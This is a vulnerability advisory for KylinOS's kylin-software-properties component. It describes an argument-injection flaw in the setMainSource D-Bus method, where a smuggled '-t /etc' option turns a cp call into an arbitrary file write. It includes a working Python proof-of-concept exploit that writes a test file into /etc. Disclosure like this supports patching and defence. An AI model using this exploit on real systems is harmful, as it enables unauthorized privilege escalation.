# Kylin OS kylin-software-properties arbitrary file write vuln

Author: Set3r.Pan（8691003@qq.com）\
Unit: KylinSoft（https://www.kylinos.cn/）
## Report
### Describe
Kylin-software-properties is a component used to set system software properties on KylinOS Desktop. The setMainSource function of this component has an arbitrary file write vulnerability. The implementation method is to call the command "cp file /etc/apt/sources.list". However, if the parameter passed is "['-t /etc /path/to/evil.txt']", the developer will split this string by space and pass it as a parameter to the cp command during implementation. Therefore, the command "cp -t /etc /path/to/evil.txt /etc/apt/sources.list" will be triggered, thereby achieving arbitrary file write in any folder. This can lead to elevation of privileges for regular users.
### Hazard level
High
### Affected version
kylin-software-properties < 0.0.1-130
### POC&&EXP
ISO Download:\
https://distro-images.kylinos.cn:8802/web_pungi/download/share/HXDYtGjZm3daA4UvOTLkiPl1nB9ErM0c/

exploit.py
```
#!/usr/bin/env python3

import sys
import dbus
import os

def set_main_source(target_dir, src_file):
  bus = dbus.SystemBus()
  obj = bus.get_object("com.kylin.software.properties", "/com/kylin/software/properties")
  proxy = dbus.Interface(obj, "com.kylin.software.properties.interface")
  proxy.setMainSource([f'-t {target_dir} {src_file}'])
  os.system('touch set_main_source.txt')

set_main_source("/etc", os.path.realpath('./set_main_source.txt'))
os.system('ls -l /etc/set_main_source.txt')
os.system('rm set_main_source.txt')
```
